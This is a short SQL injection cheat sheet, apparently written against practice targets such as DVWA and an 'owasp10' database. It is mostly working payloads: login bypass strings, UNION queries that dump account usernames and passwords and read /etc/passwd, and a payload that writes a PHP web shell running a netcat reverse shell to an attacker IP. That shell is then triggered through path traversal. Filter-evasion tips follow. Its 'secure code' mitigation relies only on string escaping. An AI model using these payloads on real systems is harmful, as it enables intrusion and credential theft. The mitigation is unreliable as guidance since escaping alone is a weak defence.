# SQL Injection

## Exploit
- Login
  - username: ```admin'#``` 
  - password: ```1' or 1=1#``` 
- Data Extracting 
  - ```?page=user-info.php&username=z' union select 1,database(),user(),version(),5%23``` 
  - ```?page=user-info.php&username=z' union select 1,table_name,null,null,5 from information_schema.tables``` 
  - ```?page=user-info.php&username=z' union select 1,table_name,null,null,5 from information_schema.tables where table_schema='owasp10'``` 
  - ```?page=user-info.php&username=z' union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'``` 
  - ```?page=user-info.php&username=z' union select 1,username,password,is_admin,5 from accounts``` 
  - ```?page=user-info.php&username=z' union select null,load_file('/etc/passwd'),null,null,null``` 
- Shell upload 
  - ```?page=user-info.php&username=z' union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'``` 
  - Listen on attacker machin:
    - nc -vv -l -p 8080
  - Run backdoor
    - ```10.20.14.211/dvwa/vulnerabilities/fi/?page=../../../../../tmp/reverse.php```
- Tips
  - TRUE statements
    - ```aNd 1=1``` & ```aNd 21=21``` & ```orDeR bY 1``` 
  - FALSE statements
    - ```dNd 0=1``` & ```anD 9=2``` & ```ordEr bY 1000000000000```   
  - Spaces
    - ```+``` & ```/**/``` & ```%20``` 
    - ```orDeR bY 1 can be re-written as``` => ```orDer+bY+1``` or ```orDer/**/bY/**/1``` or ```orDer%20bY%201```
  - Comments to end the quries
    - ```/*``` & ```//``` & ```#``` & ```%23```
    - Sometimes you might need to add ';' before the comment
      - ```anD 1=1//``` => ```anD 1=1;//```

## Mitigation
- Secure Code for login in PHP
```PHP
$query = "SELECT * FROM accounts WHERE username='".
$conn->real_escape_string($username).
"'AND password='".
$conn->real_escape_string($password).
"'"
```
